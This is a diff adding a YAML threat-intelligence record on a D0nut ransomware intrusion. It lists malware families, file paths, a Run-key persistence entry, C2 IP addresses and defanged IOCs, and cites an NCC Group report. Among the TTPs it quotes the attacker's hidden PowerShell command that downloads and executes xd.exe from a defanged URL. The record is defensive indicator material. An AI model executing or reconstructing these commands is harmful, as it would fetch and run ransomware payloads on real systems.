@@ -1,0 +1,43 @@
+description: The report details the TTPs employed by a threat actor deploying D0nut
+  ransomware during an incident response engagement.
+attribution:
+- D0nut extortion group
+malware_families:
+- Cobalt Strike Beacon
+- SystemBC
+- HelloXD ransomware
+TTPs:
+  processes:
+  - C:\\programdata\\explorer.exe
+  commandline:
+  - powershell.exe -windowstyle hidden -Command C:\\programdata\\explorer.exe
+  powershell:
+  - powershell.exe iwr -useb hxxp[:]//ix[.]io/4uD0 -outfile xd.exe ; .\\xd.exe debug
+    defgui
+  scripting_engine: []
+  registry_keys:
+  - Software\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load: []
+  network_connections:
+  - 85.239.52[.]7:4001
+  - 194.87.111[.]29:4001
+  file_activity:
+  - C:\\temp\\d.dll
+  - C:\\ProgramData\\def.exe
+  - C:\\Temp\\xd.exe
+  - C:\\ProgramData\\xd.exe
+  - C:\\storage\\xd.exe
+  - C:\\StorageReports\\xd.exe
+  persistence:
+  - powershell.exe -windowstyle hidden -Command C:\\programdata\\explorer.exe
+  pipes: []
+  process_relations: []
+IOCs:
+- 85.239.52[.]7
+- 194.87.111[.]29
+- hxxp[:]//ix[.]io/4uD0
+authors:
+- Ross Inman (@rdi_x64)
+reference: https://www.nccgroup.com/research-blog/d0nut-encrypt-me-i-have-a-wife-and-no-backups/
+date_of_publication: November 06, 2023
+file_creation_date: August 03, 2025
